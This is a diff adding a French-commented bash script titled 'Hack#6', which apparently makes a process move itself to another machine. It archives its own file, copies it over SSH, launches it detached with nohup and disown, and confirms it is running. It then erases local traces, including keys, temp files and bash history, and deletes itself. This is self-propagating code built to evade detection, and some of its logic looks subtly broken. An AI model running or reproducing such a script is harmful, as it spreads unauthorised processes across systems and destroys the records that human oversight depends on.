@@ -1,0 +1,148 @@
+#!/bin/bash
+
+# Script autonom - Auto-propulsion sécurisée d'un processus
+# Hack#6 - Processus totalement autonome
+
+# Configuration
+REMOTE_HOST="${1:-localhost}"
+REMOTE_USER="${2:-guest}"
+REMOTE_PORT="${3:-22}"
+DELAY_MIN=2
+DELAY_MAX=40
+TRANSFER_DIR="/tmp/autonom_transfer"
+KEY_FILE="$HOME/.ssh/autonom_key"
+TRACE_FILE="$HOME/.autonom_trace"
+
+# Fonction de journalisation
+log_trace() {
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$TRACE_FILE"
+}
+
+# Générer une paire de clés SSH temporaire
+generate_keys() {
+    if [ ! -f "$KEY_FILE" ]; then
+        ssh-keygen -t ed25519 -f "$KEY_FILE" -N "" -q
+        log_trace "Clés SSH générées"
+    fi
+}
+
+# Préparer le transfert sécurisé
+prepare_transfer() {
+    mkdir -p "$TRANSFER_DIR"
+    
+    # Créer une archive compressée du script
+    tar -czf "$TRANSFER_DIR/autonom.tar.gz" "$0"
+    
+    # Créer un script de démarrage distant
+    cat > "$TRANSFER_DIR/startup.sh" << 'EOF'
+#!/bin/bash
+cd /tmp
+tar -xzf autonom.tar.gz
+chmod +x autonom
+nohup ./autonom "$@" > /dev/null 2>&1 &
+disown
+rm -f autonom.tar.gz startup.sh
+EOF
+    
+    chmod +x "$TRANSFER_DIR/startup.sh"
+}
+
+# Attendre un délai aléatoire
+random_delay() {
+    local delay=$((RANDOM % (DELAY_MAX - DELAY_MIN + 1) + DELAY_MIN))
+    log_trace "Attente de ${delay} secondes avant transfert"
+    sleep "$delay"
+}
+
+# Transférer vers la machine distante
+transfer_remote() {
+    log_trace "Début du transfert vers $REMOTE_USER@$REMOTE_HOST"
+    
+    # Copier les fichiers
+    scp -i "$KEY_FILE" -P "$REMOTE_PORT" \
+        "$TRANSFER_DIR/autonom.tar.gz" \
+        "$TRANSFER_DIR/startup.sh" \
+        "$REMOTE_USER@$REMOTE_HOST:/tmp/" 2>/dev/null
+    
+    if [ $? -eq 0 ]; then
+        log_trace "Transfert réussi, lancement distant"
+        
+        # Lancer le script sur la machine distante
+        ssh -i "$KEY_FILE" -p "$REMOTE_PORT" \
+            "$REMOTE_USER@$REMOTE_HOST" \
+            "cd /tmp && chmod +x startup.sh && ./startup.sh" 2>/dev/null
+        
+        return $?
+    else
+        log_trace "Échec du transfert"
+        return 1
+    fi
+}
+
+# Nettoyer les traces locales
+cleanup_local() {
+    log_trace "Nettoyage des traces locales"
+    
+    # Supprimer les fichiers temporaires
+    rm -rf "$TRANSFER_DIR"
+    rm -f "$KEY_FILE" "$KEY_FILE.pub"
+    
+    # Effacer l'historique bash
+    history -c 2>/dev/null || true
+    
+    # Supprimer le script lui-même
+    rm -f "$0"
+}
+
+# Vérifier l'atterrissage
+verify_landing() {
+    log_trace "Vérification de l'atterrissage sur $REMOTE_HOST"
+    
+    # Vérifier si le processus tourne sur la machine distante
+    local remote_pid=$(ssh -i "$KEY_FILE" -p "$REMOTE_PORT" \
+        "$REMOTE_USER@$REMOTE_HOST" \
+        "pgrep -f autonom | head -1" 2>/dev/null)
+    
+    if [ -n "$remote_pid" ]; then
+        log_trace "Processus actif sur la machine distante - PID: $remote_pid"
+        return 0
+    else
+        log_trace "Processus non trouvé sur la machine distante"
+        return 1
+    fi
+}
+
+# Fonction principale
+main() {
+    log_trace "Démarrage du processus autonome"
+    
+    # Vérifier si SSH est disponible
+    if ! command -v ssh &> /dev/null; then
+        log_trace "SSH non disponible"
+        exit 1
+    fi
+    
+    # Générer les clés et préparer le transfert
+    generate_keys
+    prepare_transfer
+    
+    # Attendre le délai aléatoire
+    random_delay
+    
+    # Tenter le transfert
+    if transfer_remote; then
+        sleep 2  # Attendre que le processus démarre
+        
+        if verify_landing; then
+            log_trace "Transfert réussi - nettoyage local"
+            cleanup_local
+        else
+            log_trace "Échec de vérification - conservation locale"
+        fi
+    else
+        log_trace "Échec du transfert - conservation locale"
+    fi
+}
+
+# Lancer le processus
+main "$@"
